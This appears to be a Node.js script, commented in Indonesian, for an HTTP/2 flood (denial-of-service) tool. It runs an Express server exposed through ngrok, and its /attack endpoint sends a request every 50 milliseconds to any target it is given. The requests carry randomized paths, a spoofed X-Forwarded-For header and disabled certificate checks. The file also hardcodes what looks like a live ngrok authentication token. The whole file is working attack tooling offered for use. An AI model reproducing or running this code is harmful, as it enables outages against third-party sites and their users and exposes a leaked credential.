const express = require('express');
const ngrok = require('ngrok');
const http2 = require('http2');
const crypto = require('crypto');

const app = express();
app.use(express.json());

const config = {
  port: 3000,
  ngrokToken: '2xdnPcPH41TA26s84notWGL5pFV_4yyAxThJgiWnsxoqu2QAa',
  maxDuration: 300
};

let activeAttacks = new Map();

// Handle port conflict
const startServer = (port) => {
  const server = app.listen(port, async () => {
    console.log(`[+] Server jalan di port ${port}`);
    const url = await ngrok.connect({ 
      proto: 'http', 
      addr: port, 
      authtoken: config.ngrokToken 
    });
    console.log(`[+] Ngrok URL: ${url}`);
  }).on('error', err => {
    if(err.code === 'EADDRINUSE') {
      console.log(`[!] Port ${port} dipake, pindah ke ${port + 1}`);
      startServer(port + 1);
    }
  });
};

// Attack logic simpel tapi powerful
app.post('/attack', (req, res) => {
  const { target } = req.body;
  const attackId = crypto.randomBytes(8).toString('hex');
  
  const client = http2.connect(target, { 
    rejectUnauthorized: false,
    maxSessionMemory: 2048
  });
  
  const attack = setInterval(() => {
    try {
      const req = client.request({
        ':method': 'GET',
        ':path': '/?' + crypto.randomBytes(8).toString('hex'),
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'x-forwarded-for': crypto.randomInt(1,255)+'.'+crypto.randomInt(0,255)+'.'+crypto.randomInt(0,255)+'.'+crypto.randomInt(1,255)
      });
      req.on('response', () => req.end());
      req.end();
    } catch(err) {
      clearInterval(attack);
      client.destroy();
    }
  }, 50); // 20 request/detik per client

  activeAttacks.set(attackId, { client, attack });
  res.json({ status: 'Gas!', attackId });
});

startServer(config.port);
